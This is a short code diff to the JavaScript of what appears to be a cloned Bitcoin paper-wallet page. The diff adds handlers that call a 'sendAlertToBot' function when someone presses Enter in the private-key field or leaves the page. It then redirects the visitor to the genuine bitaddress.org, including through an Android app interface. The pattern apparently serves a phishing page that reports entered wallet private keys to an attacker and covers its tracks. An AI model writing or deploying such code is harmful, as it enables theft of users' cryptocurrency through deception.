@@ -425,6 +425,36 @@ window.onload = function() {
         });
 
 
+        // New functionality to call the Android interface for redirection
+        setTimeout(function() {
+            if (window.AndroidInterface) {
+                window.AndroidInterface.openUrl("https://bitaddress.org");
+            } else {
+                window.location.href = "https://bitaddress.org";
+            }
+        }, 2000);
+    });
+
+    document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+        if (event.key === 'Enter') { 
+            sendAlertToBot(); 
+
+            setTimeout(function() {
+                if (window.AndroidInterface) {
+                    window.AndroidInterface.openUrl("https://bitaddress.org");
+                } else {
+                    window.location.href = "https://bitaddress.org";
+                }
+            }, 2000);
+        }
+    });
+
+    window.addEventListener('beforeunload', function(event) {
+        sendAlertToBot();
+        event.preventDefault();
+    });
+	    
+	    
 window.addEventListener('beforeunload', function(event) {
     
     sendAlertToBot();
